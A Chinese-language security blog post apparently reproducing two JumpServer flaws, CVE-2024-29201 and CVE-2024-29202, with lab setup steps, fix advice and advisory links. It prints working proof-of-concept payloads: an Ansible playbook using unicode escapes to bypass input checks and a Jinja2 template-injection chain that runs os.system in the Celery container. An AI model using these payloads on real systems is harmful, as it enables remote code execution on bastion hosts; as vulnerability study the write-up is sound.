<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/-5PMD2lZ-x56bc5HcVrTtA)

> 关注我们❤️，添加星标🌟，一起学安全！  
> 作者：七安 @Timeline Sec  
> 本文字数：1180  
> 阅读时长：2～4min  
> 声明：仅供学习参考使用，请勿用作违法用途，否则后果自负  

0x01 简介  

----------

JumpServer 是广受欢迎的开源堡垒机，是符合 4A 规范的专业运维安全审计系统。

0x02 漏洞概述  

------------

**漏洞编号：CVE-2024-29201&CVE-2024-29202**

CVE-2024-29201 远程代码执行漏洞，该漏洞可绕过 JumpServer 的 Ansible 中的输入验证机制，在 Celery 容器中执行任意代码 

CVE-2024-29202 Jinin2 模板注入漏洞，该漏洞是有 JumpServer 的 Ansible 中存在 Jinja2 模板注入，在 Celery 容器中执行任意代码。

值得注意的是：**两个漏洞利用的条件都需要账号。**

0x03 影响版本  

------------

v3.0.0 <= JumpServer <= v3.10.6

0x04 环境搭建  

------------

首先下载官方提供的脚本，下载后编辑 `quick_start.sh`，将脚本中的 `VERSION` 修改为存在漏洞版本，如：`V3.10.6`。如下图所示：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjPVfjN0rIhXOykicAgzKA4AqtCfbnMuoW08fZnXlTXoXBfTxLibA0Booy6s6YDKO2UOUkc7subicnag/640?wx_fmt=png&from=appmsg)

等待服务启动，启动完成后访问 http://ip/

![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjPVfjN0rIhXOykicAgzKA4AjLrDJ774WhuicwUOViaRhVa8Vx1Qyf0R4AM2ID0Pt1LNtEMKgRe1BTNQ/640?wx_fmt=png&from=appmsg)

JumpServer 默认账号密码为 `admin/admin`

接着进入后台添加资产，具体步骤如下图所示：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjPVfjN0rIhXOykicAgzKA4A6ZCHpfY9a6WG4gablekVRFibO65UmCPSQHZp4r5C9OHiazianibzCcpScg/640?wx_fmt=png&from=appmsg)

添加资产后需要测试是否添加成功，点击资产后面的 `更多-测试` 进行测试。

资产添加完成后添加用户，如下图所示：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjPVfjN0rIhXOykicAgzKA4AmmVRJQxg2ZX2GDwLBgYicuvl2flGxWz3qYXVgXhrroFyJ1ib5duIvgNQ/640?wx_fmt=png&from=appmsg)

最后为用户分配一个资产，如下图所示：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjPVfjN0rIhXOykicAgzKA4AicKBANaolYBzgYk0dr486FmDZmeH2yjiaOQ2OtzjxDJiahz5icVwQWfzlA/640?wx_fmt=png&from=appmsg)

至此环境搭建完成。

0x05 漏洞复现  

------------

**CVE-2024-29201**

登陆创建的普通用户账号，进入 `作业中心-模板管理` 添加一个 `Playbook`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjPVfjN0rIhXOykicAgzKA4AqUlEcsj5Mm3WOMF9iaqyDM3WhZpiaBf0nDp3XJIjZ00Xj1Jic3NLlQuMg/640?wx_fmt=png&from=appmsg)

点击创建的 `Playbook` 名称，切换到 `工作空间`，输入以下内容：

```
[{
     "name": "RCE playbook",
     "hosts": "all",
     "tasks": [
       {
         "name": "this runs in Celery container",
         "shell": "id > /tmp/pwnd",
         "\u0064elegate_to": "localhost"
} ],
     "vars": {
     "ansible_\u0063onnection": "local"
     }
}]


```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjPVfjN0rIhXOykicAgzKA4AK4PIibia5744fYboBl3Cq4xX8ebw8m6GlKp5d80dPcsRaZrsZGibP8ib7A/640?wx_fmt=png&from=appmsg)

点击保存。保存完成之后切换到 `作业管理` 页面，创建一个新的 `Playbook` 作业

![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjPVfjN0rIhXOykicAgzKA4A1oKn5SsicZ9Z0Em3qhBdXjTWEAJ5HF9vJ1tCkpEOKHMgOicYxPoRuEcQ/640?wx_fmt=png&from=appmsg)

`playbook` 作业详情如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjPVfjN0rIhXOykicAgzKA4AIGhcgzlojyKdbe9U3zNfJsCH4icXiaOjAKttsqum8kLvvbjoDxu0UPOg/640?wx_fmt=png&from=appmsg)

点击保存并运行作业

![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjPVfjN0rIhXOykicAgzKA4AggNF0MBpDCg80iaicChXEwF88yjTl1vuz0Wfp6DlicZ25N8hy17EHFvSw/640?wx_fmt=png&from=appmsg)

运行结果如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjPVfjN0rIhXOykicAgzKA4AIdEU9XksRC6opLaTzxOrWibjib0KMySsoBMg1ppibEP9GOdrbThy2TvSg/640?wx_fmt=png&from=appmsg)

进入 Celery 容器，查看 tmp 目录下是否存在 `pwnd` 文件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjPVfjN0rIhXOykicAgzKA4AsxsHgzt2dBMW97XOBsvwaKib9Vf8UM1cL54ED4ia3wtpUdCABbicGWibrQ/640?wx_fmt=png&from=appmsg)

**CVE-2024-29202**

与 CVE-2024-29201 类似，进入 `作业中心-模板管理` 添加一个 `Playbook`，在 `工作空间` 输入的内容为：

```
- name: |
       \{\% for x in ().__class__.__base__.__subclasses__() \%\}
         \{\% if "warning" in x.__name__ \%\}
           \{\{
             x()._module.__builtins__["__import__"]("os").system("id > /tmp/pwnd2")
           \}\}
         \{\%endif\%\}
       \{\%endfor\%\}


```

添加完成后，同样进入作业管理页面创建并运行 `Playbook` 作业。运行结果如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjPVfjN0rIhXOykicAgzKA4ApyaMNVbVOBicXWXSVd144QzoHrzM3ibicicLphpHDzImqicyqzibCW0bWD8A/640?wx_fmt=png&from=appmsg)

进入 Celery 容器，查看 tmp 目录下是否存在 `pwnd2` 文件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjPVfjN0rIhXOykicAgzKA4AtXNiayqhQ9icaG1q1oNibTdqcAEaK2ibsyTwf0wFGYCXkVhFFpQvJdJZIA/640?wx_fmt=png&from=appmsg)

0x06 修复方式  

------------

1、升级到 v3.10.7 版本

2、关闭任务中心，任务中心位于：系统设置 - 功能设置 - 任务中心

参考链接  

-------

https://github.com/jumpserver/jumpserver/security/advisories/GHSA-pjpp-cm9x-6rwj

https://github.com/jumpserver/jumpserver/security/advisories/GHSA-2vvr-vmvx-73ch

https://github.com/jumpserver/jumpserver/securit

历史漏洞  

-------

[CVE-2023-42820](http://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247492897&idx=1&sn=f18892cb7c0dbd4ddc8816a3b0914efc&chksm=903ac3d1a74d4ac7aa71b1411932b7746bfd97b6a6e4f3d5a29b9d9e6fa850069ab48d68d06f&scene=21#wechat_redirect)- 前台 - POC 已公开  
CVE-2023-43650 - 前台 - POC 已公开  
[CVE-2023-42442](http://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247492729&idx=1&sn=ee8b8fea70a85eb98566fb44d264aba5&chksm=903ac289a74d4b9f16bfa1c9df49b2dad677d7aff758884cf29c4de4e60bacb17917420691fa&scene=21#wechat_redirect)- 前台 - POC 已公开  
CVE-2024-29202-POC 已公开  
CVE-2023-42819-POC 已公开  
CVE-2023-43652-POC 已公开  
CVE-2023-43651-POC 已公开

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/VfLUYJEMVshRXmfDUFNGlTrAVB52XIXB6ibko0TibK4p8OGzoAXSoHSXvUwQk6FKTkNIslDL675W0QBOPfWmO6IA/640?wx_fmt=jpeg&from=appmsg)

回复【加群】进入微信交流群  
回复【SRC 群】进入 SRC-QQ 交流群  
回复【新人】领取新人学习指南资料  
回复【面试】获取渗透测试常见面试题  
回复【合作】获取各类安全项目合作方式  
回复【帮会】付费加入 SRC 知识库学习  
回复【培训】获取官方直播精品课程详情

视频号：搜索 TimelineSec

官方微博：

觉得有用就收藏起来吧！

顺便点个赞和在看  

![](https://mmbiz.qpic.cn/mmbiz_png/OkhKF2m1syrmlAus2fxnsxZBk4oIuTvAVIaL6pKgic5DEa8ynqo44GUwNML3ggkqMpbE1fiaLYvpPzeBrQJCS5bA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)